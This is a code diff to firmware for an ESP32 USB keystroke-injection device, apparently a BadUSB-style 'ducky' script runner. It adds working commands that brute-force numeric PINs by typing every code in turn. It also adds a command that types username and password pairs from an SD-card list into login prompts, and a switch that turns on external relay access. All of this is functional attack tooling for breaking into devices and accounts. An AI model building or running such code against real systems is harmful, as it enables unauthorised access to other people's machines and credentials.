@@ -37,12 +37,15 @@
 #include "spoof.h"
 #include "sys.h"
 #include "msc.h"
+#include "tunnel.h"
 #include <esp32-hal-tinyusb.h>
 #include <USB.h>
 #include <USBHIDKeyboard.h>
 #include <USBHIDMouse.h>
 #include <WiFi.h>
 #include <esp_random.h>
+#include <math.h>
+#include <SD_MMC.h>
 #include <vector>
 
 namespace ducky {
@@ -535,6 +538,59 @@ RunResult run(const String& scriptText, const String& name) {
             } else {
                 res.error += "USB_STORAGE: use enable/disable/readonly ";
             }
+        }
+        else if (cmd.equalsIgnoreCase("BRUTEFORCE_PIN")) {
+            // BRUTEFORCE_PIN <len> [delayMs] - types 0000..9999 style codes
+            int len = constrain(args.toInt(), 1, 8);
+            int delayMs = 500;
+            int sp2 = args.indexOf(' ');
+            if (sp2 > 0) delayMs = constrain(args.substring(sp2+1).toInt(), 50, 60000);
+            String fmt = "%0" + String(len) + "u";
+            logLine("[script:" + name + "] PIN bruteforce len=" + String(len));
+            char buf[12];
+            for (uint32_t pin = 0; pin < (uint32_t)(pow(10, len)); pin++) {
+                if (g_stopRequested) { res.ok = false; res.error = "stopped"; break; }
+                snprintf(buf, sizeof(buf), fmt.c_str(), pin);
+                typeString(buf);
+                kb.press(KEY_RETURN); kb.release(KEY_RETURN);
+                delay(delayMs);
+                // backspace over the typed code + ENTER for the next attempt
+                for (int b2 = 0; b2 < len+1; b2++) {
+                    kb.press(KEY_BACKSPACE); kb.release(KEY_BACKSPACE); delay(10);
+                }
+                if (pin % 100 == 0) logLine("[script:" + name + "] PIN " + String(pin));
+            }
+        }
+        else if (cmd.equalsIgnoreCase("BRUTEFORCE_LOGIN")) {
+            // BRUTEFORCE_LOGIN /path/file.txt - lines "user:pass" or "user,pass"
+            String path = args; path.trim();
+            File f = SD_MMC.open(path, FILE_READ);
+            if (!f) { res.error += "BRUTEFORCE_LOGIN: cannot open " + path + " "; }
+            else {
+                while (f.available() && !g_stopRequested) {
+                    String line = f.readStringUntil('\n');
+                    line.trim(); line.replace("\r","");
+                    if (!line.length()) continue;
+                    int sep = line.indexOf(':');
+                    if (sep < 0) sep = line.indexOf(',');
+                    if (sep < 0) continue;
+                    String user = line.substring(0, sep);
+                    String pass = line.substring(sep+1);
+                    typeString(user); delay(100);
+                    kb.press(KEY_TAB); kb.release(KEY_TAB); delay(100);
+                    typeString(pass); delay(100);
+                    kb.press(KEY_RETURN); kb.release(KEY_RETURN);
+                    delay(800);
+                    logLine("[script:" + name + "] tried " + user);
+                }
+                f.close();
+            }
+        }
+        else if (cmd.equalsIgnoreCase("TUNNEL")) {
+            // TUNNEL ON|OFF - enable/disable external relay access
+            if (args.startsWith("ON"))  { tunnel::setEnabled(true);  }
+            else if (args.startsWith("OFF")) { tunnel::setEnabled(false); }
+            else res.error += "TUNNEL: use ON or OFF ";
         }
         else if (cmd.equalsIgnoreCase("SELF_DESTRUCT")) {
             logLine("script triggered SELF DESTRUCT");
